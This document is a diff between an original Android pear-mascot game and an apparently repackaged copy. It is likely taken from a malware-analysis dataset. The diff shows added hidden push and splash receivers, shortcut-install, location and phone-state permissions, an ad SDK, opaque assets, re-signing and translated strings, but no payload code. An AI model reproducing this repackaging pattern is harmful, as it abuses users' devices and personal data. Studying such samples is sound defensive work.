@@ -1,0 +1,662 @@
+diff -r result/APP_78/App_B_78/AndroidManifest.xml result/APP_78/App_M_78/AndroidManifest.xml
+5c5
+<         <activity android:finishOnCloseSystemDialogs="true" android:name="com.todayallo.funafuna.activities.MainActivity" android:screenOrientation="portrait" android:theme="@style/ThemeStyle">
+---
+>         <activity android:name="com.pujiahh.Main" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+10a11
+>         <activity android:finishOnCloseSystemDialogs="true" android:name="com.pujiahh.Main1" android:screenOrientation="portrait" android:theme="@style/ThemeStyle"/>
+26a28,54
+>         <activity android:exported="true" android:name="com.mgassistant.promotion.MGAActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+>         <activity android:excludeFromRecents="true" android:label="" android:name="com.pujiahh.push.Pb" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <receiver android:name="com.pujiahh.push.Pd">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.pujiahh.push.Pc"/>
+>         <activity android:configChanges="keyboard|keyboardHidden|orientation" android:launchMode="singleInstance" android:name="com.pujiahh.splash.Pbb" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+>         <receiver android:name="com.pujiahh.splash.Pcc">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.pujiahh.splash.Pdd"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="53a241a256240b1b290505c8"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="appchina"/>
+27a56,67
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+>     <uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+diff -r result/APP_78/App_B_78/apktool.yml result/APP_78/App_M_78/apktool.yml
+2c2
+< apkFileName: Bapp78-B2BA92F966D68D468C3D1CC9865B551156EEF42260BC46C9714CA6E3D0D8CC3D.apk
+---
+> apkFileName: Mapp78-A7EE14E6D38FCF58ECB8A774955E28890E6486CA4B59D1F633AC8FF0A5D7ECA6.apk
+6d5
+< - mp3
+7a7,10
+> - mp3
+> - assets/config.properties
+> - assets/SJIL
+> - assets/IoWG
+diff -r result/APP_78/App_B_78/assets/character.csv result/APP_78/App_M_78/assets/character.csv
+1,16c1,16
+< ふなっしー,非公認マスコットキャラ。2000年に1度だけ現れる奇跡の「梨の妖精」で、誕生日は138年7月4日。本名は「フナディウス4世」。ひゃっはー！梨汁ブシャー！！！,1,3,0,0,0,0
+< リラッフナ,カオルさん宅にある日突然やってきて居候させてもらっている着ぐるみの梨。一部の業界では「NEETのカリスマ」などと称されているなっしー。,3,1,1,5,0,0
+< 名探偵フナン,とある組織の薬の副作用によって梨に姿を変えられてしまった高校生名探偵。なぜか行く先々で事件に遭遇するという謎だけは永遠に未解決。真実はいつもぶしゃー！,2,3,2,8,0,0
+< 機関車フーナス,元気でいたずら好きな蒸気機関梨。みんなの役に立てるよう日夜頑張っているなっしー。ただ、時折見せる毒舌には梨汁ぶしゃー((((；ﾟДﾟ)))),3,4,3,10,0,0
+< ふなじろう,ちゃれんじ園のリーダ的存在。サッカーが得意で梨が大好き。怪談、雷とピーマンが苦手。便をトイレでできたらパンツマンに変身できるなっしー！,3,5,4,12,0,0
+< ハピネスチャージプリフナ！,元気と笑顔がとりえの9代目のプリフナ。好きな言葉は「梨」と「汁」と「ぶしゃー」。「あの子の周りは幸せの梨汁でいっぱい」と言われているなっしー。,2,8,4,22,5,10
+< フナイダーマン,放射線を浴びた蜘蛛に噛まれてスーパーパワーを手に入れたヒーロー。手首から梨汁を発射する、あなたの親愛なる隣梨フナイダーマンなっしー！,2,7,6,10,5,22
+< ふーなん,「音楽の国」にある「音楽の森」に住んでいる小さな梨。いつも陽気で明るく元気にあいさつなっしー。「ふーなん、げんき！げんき！！ぶしゃー！！！」,1,1,7,10,6,21
+< フナえもん,22世紀のにフナシバ工場でフナコ・F・フナオが作り出したナシ型ロボット。四次元ポケットから梨汁でべちゃべちゃになった未来の便利道具を出すなっしー。,2,10,8,9,7,20
+< フーナおじさん,日本初となる某スナック菓子のイメージキャラクター。♪い～いも～んだぁな～梨汁～は♪,3,3,9,9,8,19
+< マイフナディ,女子高生、女子中学生を中心に人気の、ウサギをモチーフに赤ずきんをかぶせた梨キャラクター。通称「フナメロ」,1,5,10,10,9,20
+< シャア・アフナブル,「赤い彗星」呼ばれる、通常の三倍の速度で動ける梨。「認めたくないものだな、自分自身の梨故の過ちというものを」など名言が多いなっしー。,1,6,11,11,10,22
+< フナチュー,でんきタイプの梨ポケモンで、ポケモン界を代表する超人気者。赤い頬は「なしじるぶくろ」と呼ばれ、梨汁を生成し、それを放出する「10万梨汁」が得意技なっしー。,3,2,12,13,11,24
+< 円堂フナル,サッカー部のキャプテンでポジションはGK。必殺技は「梨ゴッドハンド」、「梨熱血パンチ」、「梨汁パンチ」、「マジン・ザ・ハンド梨」など常軌を逸したものが多いなっしー。,3,7,13,15,12,27
+< バズ・ライトフナー,体にいろいろな仕掛けがある高性能の梨おもちゃ。アクションボタンを押すと再生される「無限の梨汁へ さあぶしゃー!」が決め台詞なっしー。,1,8,14,20,13,30
+< フナ越シェフ,ドヤ顔で人々を魅了し続けるオーナーシェフ。ジャンルにとらわれない斬新な料理と高価な水、そして「フナ越スマイル」で低所得者をあざ笑うなっしー。,2,8,14,30,15,50
+\ Nenhum caractere de nova linha no final do arquivo
+---
+> 船梨精,非公认吉祥物。2000年出现一次的奇迹的「梨之妖精」，生日是138年7月4日。本名「福纳迪乌斯４世」。嘻哈！梨汁喷射！！！,1,3,0,0,0,0
+> 轻松船梨,突然出现在小薰家里寄居的穿着玩偶服的梨。一部分业界称呼他为「ＮＥＥＴ大师」哦梨～,3,1,1,5,0,0
+> 名侦探船梨,因为某个组织的药的副作用而改变了外表的高中生名侦探。不知为何去处总会发生事件，是个永远的不解之谜。真相永远只有喷射——！,2,3,2,8,0,0
+> 火车头船梨,充满精神，喜欢恶作剧的蒸汽机车梨。为了帮助大家，每天都在努力哦梨～可是偶尔会说出恶毒的话，梨汁喷射——((((；ﾟДﾟ)))),3,4,3,10,0,0
+> 船梨二郎,挑战园的领队级存在。擅长足球，最喜欢梨。讨厌鬼故事和青椒。在厕所大便就可以变身成内裤超人哦梨～！,3,5,4,12,0,0
+> 可爱天使光之美船梨！,优点是精神与笑容的第9代光之美船梨。喜欢的词语是「梨」和「汁」和「喷射——」。别人都说「他身边充满了幸福的梨汁」哦梨～,2,8,4,22,5,10
+> 船梨蜘蛛侠,被放射线照射过的蜘蛛咬了一口，获得超级力量的英雄。手腕可以喷射出梨汁。你亲爱的邻居，船梨蜘蛛侠哦梨～！,2,7,6,10,5,22
+> 福纳恩,住在「音乐之国」的「音乐之森」的小小的梨。总是很开朗，精力充沛地向人打招呼哦梨～「福纳恩很精神！精神！！喷射——！！！」,1,1,7,10,6,21
+> 船梨Ａ梦,22世纪的船梨芝工厂中，被船梨子·Ｆ·船梨雄造出的梨型机器人。能从四次元口袋中掏出沾满了梨汁的未来的方便道具哦梨～,2,10,8,9,7,20
+> 船梨大叔,日本第一的某零食的吉祥物角色。♪真～是好～东西啊～梨汁～♪,3,3,9,9,8,19
+> Ｍｙ船梨ｄｙ,很受女高中生、女初中生欢迎的以兔子为原型的戴着红头巾的梨角色。统称「船梨Ｍｅｌｏ」。,1,5,10,10,9,20
+> 夏亚・阿福纳布尔,被称为「红色彗星」的以常人三倍速运动的梨。说过「真是不想承认啊，因为自己是梨而犯下的错误」等等很多的名言哦梨～,1,6,11,11,10,22
+> 船梨丘,电系的梨口袋妖怪，代表了口袋妖怪界的超受欢迎的存在。红色的脸颊被称为「梨汁颊」，可以生成梨汁，释放出「１０万梨汁」，是他的擅长技能哦梨～,3,2,12,13,11,24
+> 円堂船梨守,足球部的队长，担任守门员。必杀技是「梨神之手」「梨热血之拳」「梨汁拳」「魔神之手梨」等等，都很超出常规哦梨～,3,7,13,15,12,27
+> 巴斯・光福纳,身体有各种机关的高性能梨玩家。按下动作键播放的「走吧，前往无限的梨汁，喷射——」是决定性台词哦梨～,1,8,14,20,13,30
+> 船梨越厨师,以坏笑表情迷住了人们的主厨。以不被种类束缚的崭新菜肴、贵重的水和「船梨越笑容」嘲笑低收入者哦梨～,2,8,14,30,15,50
+\ Nenhum caractere de nova linha no final do arquivo
+Somente em result/APP_78/App_M_78/assets: config.properties
+Somente em result/APP_78/App_M_78/assets: icon_jiajia.png
+Somente em result/APP_78/App_M_78/assets: IoWG
+Somente em result/APP_78/App_M_78/assets: jiajia
+Somente em result/APP_78/App_M_78/assets: pujiahh
+Somente em result/APP_78/App_M_78/assets: SJIL
+Somente em result/APP_78/App_M_78/com: mgassistant
+Somente em result/APP_78/App_M_78/com: pujiahh
+diff -r result/APP_78/App_B_78/com/todayallo/funafuna/activities/MainActivity.java result/APP_78/App_M_78/com/todayallo/funafuna/activities/MainActivity.java
+77,78c77,78
+<       localBuilder.setNegativeButton("後で", null);
+<       localBuilder.setNeutralButton("以後表示しない", new DialogInterface.OnClickListener()
+---
+>       localBuilder.setNegativeButton("稍后", null);
+>       localBuilder.setNeutralButton("以后不再显示", new DialogInterface.OnClickListener()
+85c85
+<       localBuilder.setPositiveButton("協力", new DialogInterface.OnClickListener()
+---
+>       localBuilder.setPositiveButton("协助", new DialogInterface.OnClickListener()
+diff -r result/APP_78/App_B_78/com/todayallo/funafuna/activities/MoreActivity.java result/APP_78/App_M_78/com/todayallo/funafuna/activities/MoreActivity.java
+92c92
+<         String str2 = "「" + ((HashMap)Util.mPicoInfo.get(i)).get("name").toString() + "」を捕まえた！";
+---
+>         String str2 = "「" + ((HashMap)Util.mPicoInfo.get(i)).get("name").toString() + "」被抓住了！";
+109c109
+<         String str2 = "「" + ((HashMap)Util.mPicoInfo.get(i)).get("name").toString() + "」を捕まえた！";
+---
+>         String str2 = "「" + ((HashMap)Util.mPicoInfo.get(i)).get("name").toString() + "」被抓住了！";
+diff -r result/APP_78/App_B_78/com/todayallo/funafuna/activities/ZukanActivity.java result/APP_78/App_M_78/com/todayallo/funafuna/activities/ZukanActivity.java
+191c191
+<         localObject1 = localObject1 + "を" + k + "体";
+---
+>         localObject1 = localObject1 + "" + k + "只";
+210c210
+<     for (localObject1 = localObject1 + "、" + ((HashMap)Util.mPicoInfo.get(i1 - 1)).get("name").toString();; localObject1 = localObject1 + "、???")
+---
+>     for (localObject1 = localObject1 + "" + ((HashMap)Util.mPicoInfo.get(i1 - 1)).get("name").toString();; localObject1 = localObject1 + "、???")
+212c212
+<       localObject2 = localObject1 + "を" + k + "体";
+---
+>       localObject2 = localObject1 + "" + k + "只";
+214c214
+<         localTextView.setText("あと、" + (String)localObject2 + "収穫すると出現!");
+---
+>         localTextView.setText("再将" + (String)localObject2 + "收获后会出现!");
+diff -r result/APP_78/App_B_78/com/todayallo/funafuna/services/NotifyService.java result/APP_78/App_M_78/com/todayallo/funafuna/services/NotifyService.java
+33,34c33,34
+<     localNotification.tickerText = "ふなっしーが収穫を待ってます!!";
+<     localNotification.setLatestEventInfo(this, getString(2131099648), "ふなっしーが収穫を待ってます!!", paramIntent);
+---
+>     localNotification.tickerText = "船梨精等着你来收获呢!!";
+>     localNotification.setLatestEventInfo(this, getString(2131099648), "船梨精等着你来收获呢!!", paramIntent);
+Somente em result/APP_78/App_M_78/com: umeng
+Os arquivos binários result/APP_78/App_B_78/original/AndroidManifest.xml e result/APP_78/App_M_78/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_78/App_B_78/original/META-INF/CERT.RSA e result/APP_78/App_M_78/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_78/App_B_78/original/META-INF/CERT.SF result/APP_78/App_M_78/original/META-INF/CERT.SF
+2,3c2,3
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: gHaOMb7QxJpVxYVLEGAEnpJOGhM=
+---
+> Created-By: 1.0 (Android SignApk)
+> SHA1-Digest-Manifest: Ohf2PI9OVCEY8t07FGNkPXaxPtE=
+11,13d10
+< Name: res/raw/get1_2.mp3
+< SHA1-Digest: GPnSNRJPhVkuWOn3gABkFx27QJA=
+< 
+19a17,19
+> Name: res/raw/get1_2.mp3
+> SHA1-Digest: GPnSNRJPhVkuWOn3gABkFx27QJA=
+> 
+30c30
+< SHA1-Digest: DIOZW3OaN6FJFxNitYogBXBxj8o=
+---
+> SHA1-Digest: g6ZQJePUC9rNiw0ey55lEh9ODYc=
+42c42
+< SHA1-Digest: u7/rUswgDHhgQhEUbMQf0oujUmk=
+---
+> SHA1-Digest: rVC0gK+csQszDEWpBbRd/i3kZGk=
+48c48
+< SHA1-Digest: Tsm9YlOatx4aEWEylWFr6MnOadE=
+---
+> SHA1-Digest: uuUtkEJ2+WwRaNMg67JG8+ch3CY=
+54c54
+< SHA1-Digest: ZTX1PsXPWug+mccQLMT5aNn5aQA=
+---
+> SHA1-Digest: eOalBHMZZAsQAb7Ru7fiJdxgih0=
+84c84
+< SHA1-Digest: JpjenI4W2d0X8OcWXqA9AIa1XlM=
+---
+> SHA1-Digest: +FLTfy8nymJJnNg3qd/eNapj1ck=
+103a104,106
+> Name: assets/config.properties
+> SHA1-Digest: NAij+xYApm66OL0dKYhIrV7cz2M=
+> 
+116,118d118
+< Name: res/layout/end.xml
+< SHA1-Digest: 3LfgJ3hyyXYAjXjl6TY+4rLpiYE=
+< 
+121a122,124
+> Name: res/layout/end.xml
+> SHA1-Digest: ZDZcJY3/RJDOcx8Ug1iyTyqvDb4=
+> 
+128,130d130
+< Name: resources.arsc
+< SHA1-Digest: 5N2RL/P3dTStTi12+u/qDQQg7QE=
+< 
+134,135c134,135
+< Name: res/drawable-xhdpi/scrubber_control_focused_holo.png
+< SHA1-Digest: Pm9tBorpcfu8KRJhQeXaSDrMYZQ=
+---
+> Name: resources.arsc
+> SHA1-Digest: 8Es2RUjLA1fQjd9RVyrhaDKUAU8=
+139a140,142
+> Name: res/drawable-xhdpi/scrubber_control_focused_holo.png
+> SHA1-Digest: Pm9tBorpcfu8KRJhQeXaSDrMYZQ=
+> 
+143,144c146,147
+< Name: res/drawable-ldpi/scrubber_control_focused_holo.png
+< SHA1-Digest: XguvcK0VLUqMyuz3inT3YYUZX0U=
+---
+> Name: AndroidManifest.xml
+> SHA1-Digest: D5SGen3kZnpegyrnpovgkXgCa6g=
+149,150c152,156
+< Name: AndroidManifest.xml
+< SHA1-Digest: ImtMB7QrkIT1U78BK3TQhzsPmRw=
+---
+> Name: res/drawable-ldpi/scrubber_control_focused_holo.png
+> SHA1-Digest: XguvcK0VLUqMyuz3inT3YYUZX0U=
+> 
+> Name: assets/pujiahh/info/pujia.html
+> SHA1-Digest: zBKNkTXxrNzN93lxTjd/aur0QmQ=
+166a173,175
+> Name: assets/pujiahh/info/pujia_logo.png
+> SHA1-Digest: EB0t7YZNe+Af0i3VAqevnaxYlPA=
+> 
+176,178d184
+< Name: assets/gamefeat_popup_bg_land_exit.png
+< SHA1-Digest: eduui+1iL/p+uU/F/nG/nlXqo2M=
+< 
+181a188,190
+> Name: assets/gamefeat_popup_bg_land_exit.png
+> SHA1-Digest: eduui+1iL/p+uU/F/nG/nlXqo2M=
+> 
+183c192
+< SHA1-Digest: VeXTFWEQCJ1PCePiWUw05bIif3M=
+---
+> SHA1-Digest: TnGMmGtUVeTvkG0RN17Cn+AT//c=
+186c195
+< SHA1-Digest: g+g3XIvRDhv2t/f4N6VwLHR3rV0=
+---
+> SHA1-Digest: 1wF0dU+OpSXODha2Wv5l12zE7Sg=
+204c213
+< SHA1-Digest: adYEvneLzR+DqJEi9o/XBrUNbg8=
+---
+> SHA1-Digest: HG8tSZttugMncsas9GDy7r/peyw=
+219c228
+< SHA1-Digest: aGnkCjNqOfzMfYxKBxrMCwQ+MlM=
+---
+> SHA1-Digest: I95UBaQ/jckhOHEXyubXSCHRLwU=
+232a242,244
+> Name: assets/jiajia
+> SHA1-Digest: LaMJ5p2lPH48n4ORbaa047l5z/k=
+> 
+237c249
+< SHA1-Digest: 6SIHIcpghAjDB0WCO4SH8Tj+HcY=
+---
+> SHA1-Digest: 4pu8B+X4Jt7Xn9X2155ZNIr4DZg=
+248,249c260,261
+< Name: res/drawable-ldpi/switch_thumb_activated_holo_light.9.png
+< SHA1-Digest: sZtiG0qPYz1degRQYv1K7YqIvxY=
+---
+> Name: res/raw/get1_4.mp3
+> SHA1-Digest: rzx/LYGFFTTb4AWueEQDm0OoTPA=
+252c264
+< SHA1-Digest: 8O+gH/4347nl0wLGqrYB8z0j9Fk=
+---
+> SHA1-Digest: 6HUpCxBRGHtoWHVkJv81QnTRxRM=
+254,255c266,270
+< Name: res/raw/get1_4.mp3
+< SHA1-Digest: rzx/LYGFFTTb4AWueEQDm0OoTPA=
+---
+> Name: assets/pujiahh/info/mofang_logo.png
+> SHA1-Digest: m3NS5TGRmpjwZdQGxVF7po+QFf4=
+> 
+> Name: res/drawable-ldpi/switch_thumb_activated_holo_light.9.png
+> SHA1-Digest: sZtiG0qPYz1degRQYv1K7YqIvxY=
+268a284,286
+> Name: assets/icon_jiajia.png
+> SHA1-Digest: UIDjEI7FL681GrconVGJhcBGGug=
+> 
+271a290,292
+> Name: res/layout/pujiahtml.xml
+> SHA1-Digest: 3a7Fn/I8/VxdtbmdP5RaQPgr4JA=
+> 
+292a314,316
+> Name: assets/SJIL
+> SHA1-Digest: Gfyxwp0zZyBRcoL/IT5fybYLsWQ=
+> 
+294c318
+< SHA1-Digest: rm0jLk/2e/ls0TmxEe6gWHEmZ4Y=
+---
+> SHA1-Digest: qjP2gWXlU7Nmy8EDKh3G1dfT384=
+324c348
+< SHA1-Digest: 8+BI6AdTna/jNDdDeZQ40hFfS8Q=
+---
+> SHA1-Digest: efnv4H8Ee2MJ8l9VoNW/B/hOdpI=
+327c351
+< SHA1-Digest: fVPVJKWPnS+uNehCnzw2+AMlqOI=
+---
+> SHA1-Digest: rdllRhs/IvrCAJroKRiwZIzyoug=
+342c366
+< SHA1-Digest: NdsHJch11fyyMx+hDtENbWyfh/4=
+---
+> SHA1-Digest: hia98zd8QpLkHSqJlmnYMkIXwGg=
+352a377,379
+> Name: assets/character.csv
+> SHA1-Digest: 9A8SQ1rD78v9b4BIyWF3t5Ay+Pc=
+> 
+356,358d382
+< Name: assets/character.csv
+< SHA1-Digest: jkdl+3nAFcTXZogi66kgvZcvZZ4=
+< 
+360c384
+< SHA1-Digest: pc3HJProSPRZJCaqAMs4nMjXtLc=
+---
+> SHA1-Digest: XYWap8LuYG7oFzpYmwx4HI7waIQ=
+363c387
+< SHA1-Digest: 5TdVWXJclRVsm3HpwfKwHCBfcOc=
+---
+> SHA1-Digest: uayNhB/GqBazHvpzmW58WSa7rro=
+366c390
+< SHA1-Digest: +aAcl9+IpdNI4/No3KW1faMl0x8=
+---
+> SHA1-Digest: mxsz7HFGuZw5M8Tl3l7VDMjznlU=
+373a398,400
+> Name: assets/IoWG
+> SHA1-Digest: wj3VnRfAjlJPyOT5Oe1i7aKd6rk=
+> 
+381,384c408
+< SHA1-Digest: hUrMGFOs/fYkDiHzbQos7tPdCn0=
+< 
+< Name: res/drawable-nodpi/pico3.png
+< SHA1-Digest: nUzQCpDayoMAK1/bWVUuLmy0PEQ=
+---
+> SHA1-Digest: KjpCY/3HFKOBu4W/FTxyLFWc6UA=
+388a413,415
+> Name: res/drawable-nodpi/pico3.png
+> SHA1-Digest: nUzQCpDayoMAK1/bWVUuLmy0PEQ=
+> 
+390c417
+< SHA1-Digest: QHdMWzTkhWXMpFq3OJizSIQUYzk=
+---
+> SHA1-Digest: WFSg2HLx6zGBmmLmg6D4NoEj89s=
+diff -r result/APP_78/App_B_78/original/META-INF/MANIFEST.MF result/APP_78/App_M_78/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.0 (Android SignApk)
+9a10,12
+> Name: res/raw/get1_2.mp3
+> SHA1-Digest: wmzxdsq4tgSdNFJMuDg0+UMusXs=
+> 
+16,18d18
+< Name: res/raw/get1_2.mp3
+< SHA1-Digest: wmzxdsq4tgSdNFJMuDg0+UMusXs=
+< 
+29c29
+< SHA1-Digest: LPgoh0X6eC3F4M9PQqc77DNiy8k=
+---
+> SHA1-Digest: r7VnQbr2g9XL3R9HqJuuu+TgqS0=
+41c41
+< SHA1-Digest: MHCozb9HMNP8UZXuqAiKOH+ZPqE=
+---
+> SHA1-Digest: 8gabBpEO7XB72Wtg2yEJozTkkT4=
+47c47
+< SHA1-Digest: JNBpULUYVeAS5mC5hA0nMe7tVa4=
+---
+> SHA1-Digest: rsINPD0bSmEl46IpYlgI7/16My4=
+53c53
+< SHA1-Digest: ul6gmUqrkDGzH0RHzknfNLGrFNw=
+---
+> SHA1-Digest: WJvpOFB1tKLDdgIVYksMy5tpZv4=
+83c83
+< SHA1-Digest: pgenQf5nfHU3Y74vlzKyFq2R388=
+---
+> SHA1-Digest: PyjLeiQnGHUMOPeqauE6zlBr8Us=
+99a100,102
+> Name: assets/config.properties
+> SHA1-Digest: e77IFYev6gQ0ntx/Nvpwue3kEyI=
+> 
+114a118,120
+> Name: res/layout/end.xml
+> SHA1-Digest: mdlAC2o4NAVSQ7MlGMux6X84etE=
+> 
+118,120d123
+< Name: res/layout/end.xml
+< SHA1-Digest: HzudkStn3me4jpnQKN5fCIQBd/o=
+< 
+126a130,132
+> Name: resources.arsc
+> SHA1-Digest: 0nJeRqqfxEYzHIWFQ19l60W1TKU=
+> 
+130,131c136,137
+< Name: resources.arsc
+< SHA1-Digest: abImN3EmR1t+x0QV12NKmzLf+LE=
+---
+> Name: res/drawable-xhdpi/scrubber_control_focused_holo.png
+> SHA1-Digest: eU+MCne4Jq6+DgDdGxjWs1Y4qog=
+136,138d141
+< Name: res/drawable-xhdpi/scrubber_control_focused_holo.png
+< SHA1-Digest: eU+MCne4Jq6+DgDdGxjWs1Y4qog=
+< 
+141a145,147
+> Name: AndroidManifest.xml
+> SHA1-Digest: 2VgTmnJAyNWf9MPMKHR/FswN0Hs=
+> 
+148,149c154,155
+< Name: AndroidManifest.xml
+< SHA1-Digest: rC3kZcCjIhiNisRwdzOjYQeeC8w=
+---
+> Name: assets/pujiahh/info/pujia.html
+> SHA1-Digest: PNgHn/eunZJJ2qhzgB1cENY3vv4=
+165a172,174
+> Name: assets/pujiahh/info/pujia_logo.png
+> SHA1-Digest: pzlpvKmJD4Exbo9bau8tGrDQGCA=
+> 
+175,177d183
+< Name: assets/gamefeat_popup_bg_land_exit.png
+< SHA1-Digest: P7shy/Dkjug4YC2r3Um68dbtpMc=
+< 
+180a187,189
+> Name: assets/gamefeat_popup_bg_land_exit.png
+> SHA1-Digest: P7shy/Dkjug4YC2r3Um68dbtpMc=
+> 
+182c191
+< SHA1-Digest: tixQaNcQcSH/yFiRsYAGTtNCnrY=
+---
+> SHA1-Digest: /oh4epw+lDLc/x8LnJVvbHKzatg=
+185c194
+< SHA1-Digest: Y/PLdtSRliJhacTe2536YMHAsbI=
+---
+> SHA1-Digest: 3zMvR2ofnKVpZNnwCwJfiEpqkDw=
+203c212
+< SHA1-Digest: QD2AvVbnucIMvtqV18e84hICuM0=
+---
+> SHA1-Digest: 3WboIq+5Kg+valqmdwm+74BA3N8=
+218c227
+< SHA1-Digest: nqmnQ3qXUaqpnlMYMYXa0cG7bBw=
+---
+> SHA1-Digest: 7ncU7qRjOg3ROypo0TFJjCeGaUY=
+231a241,243
+> Name: assets/jiajia
+> SHA1-Digest: hf0jHOgfrkhm4Yj+5OPhAwr9c88=
+> 
+236c248
+< SHA1-Digest: khiqV4NPQeR4h4PVMzvPy4vrieE=
+---
+> SHA1-Digest: ZoRCdmcp5wwddi5gEXoDVhPn3Rw=
+247,248c259,260
+< Name: res/drawable-ldpi/switch_thumb_activated_holo_light.9.png
+< SHA1-Digest: sd0JlTBz5A5sEJ4nt4bFZO7abA8=
+---
+> Name: res/raw/get1_4.mp3
+> SHA1-Digest: REopNKZSzA9man9tpSgj2RwMEwA=
+251c263
+< SHA1-Digest: 7jE/jVN/KoqRAZNj8L5mVMa9eN4=
+---
+> SHA1-Digest: yRrOoy0Xh37WKtBLnFJtw7YIq7g=
+253,254c265,269
+< Name: res/raw/get1_4.mp3
+< SHA1-Digest: REopNKZSzA9man9tpSgj2RwMEwA=
+---
+> Name: assets/pujiahh/info/mofang_logo.png
+> SHA1-Digest: c0zutR3SpxnWi5/prhXM+XukLs0=
+> 
+> Name: res/drawable-ldpi/switch_thumb_activated_holo_light.9.png
+> SHA1-Digest: sd0JlTBz5A5sEJ4nt4bFZO7abA8=
+267a283,285
+> Name: assets/icon_jiajia.png
+> SHA1-Digest: TJ8HQtQxavs0E3XfQDJ8HoB8lWk=
+> 
+270a289,291
+> Name: res/layout/pujiahtml.xml
+> SHA1-Digest: cXW7SyP8x6iaDgS+asdxiBMfwgA=
+> 
+291a313,315
+> Name: assets/SJIL
+> SHA1-Digest: 4GHZg+vCWEVce4jpM/eGINzzaHg=
+> 
+296c320
+< SHA1-Digest: zp2z33l/7vUEW3O/XVnCIhsN8Rg=
+---
+> SHA1-Digest: 2lpq8BLSBjAlYMtdJsZ5/cer6yk=
+323c347
+< SHA1-Digest: sMovF2l0imMXoY45PyVMy3zSnmA=
+---
+> SHA1-Digest: 1Y0erfNa6rWlyiJyrdlXxxgt/2Y=
+329c353
+< SHA1-Digest: A9EzXFNElyIa1mG/M0xpV1fisc8=
+---
+> SHA1-Digest: MHVXz7vWvxq3ERfTUegBSvpdXms=
+341c365
+< SHA1-Digest: WZ7ugW6LY1sM1t5XLwHF+WGeHZA=
+---
+> SHA1-Digest: s3lnlxfAI15NqfuNGPgA7Vsw7Bs=
+352,354d375
+< Name: assets/character.csv
+< SHA1-Digest: O3XIaxZttp3gLPCJaYCJqYC+rpM=
+< 
+357a379,381
+> Name: assets/character.csv
+> SHA1-Digest: DfgtS6oExvh86T/TppuXJh2BxPc=
+> 
+359c383
+< SHA1-Digest: qKlnAf30lCJDz8TT90/8v39I/Gs=
+---
+> SHA1-Digest: hTfW4atSVIg3j7rKqM4CHUDUG2Y=
+362c386
+< SHA1-Digest: +p6fg65G+zQhlJFMY9mtmO8x2VQ=
+---
+> SHA1-Digest: ffIUf16aZykeX1GnwWmNjs0FaPA=
+368c392
+< SHA1-Digest: XU4UJaAfuqXQPu5OJ8ME5c3ZQRU=
+---
+> SHA1-Digest: esCR1kJJMKcEWwXVMc2PkJTq3wc=
+372a397,399
+> Name: assets/IoWG
+> SHA1-Digest: jnw+z/8XCw90pT7tWpOTp9/6Ky8=
+> 
+380,383c407
+< SHA1-Digest: SahBGAa2uNnrbNJMj3L2trBJWXA=
+< 
+< Name: res/drawable-hdpi/scrubber_control_normal_holo.png
+< SHA1-Digest: mIZS3M/+Jiph1zk6ExtWIVYwUl8=
+---
+> SHA1-Digest: SGVqwJttMtj3GugjonvS2rcDljA=
+387a412,414
+> Name: res/drawable-hdpi/scrubber_control_normal_holo.png
+> SHA1-Digest: mIZS3M/+Jiph1zk6ExtWIVYwUl8=
+> 
+389c416
+< SHA1-Digest: GxQKRdvG7U1N1wKZL5I9zi7x1dU=
+---
+> SHA1-Digest: 3Wik+MDTDNfmccEnPqrO2GzMOJc=
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/back.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/back.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/bt_01.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/bt_01.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/bt_02.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/bt_02.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/bt_03.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/bt_03.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/bt_04.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/bt_04.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/collection.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/collection.png são diferentes
+Os arquivos binários result/APP_78/App_B_78/res/drawable-nodpi-v4/facebook_bt.png e result/APP_78/App_M_78/res/drawable-nodpi-v4/facebook_bt.png são diferentes
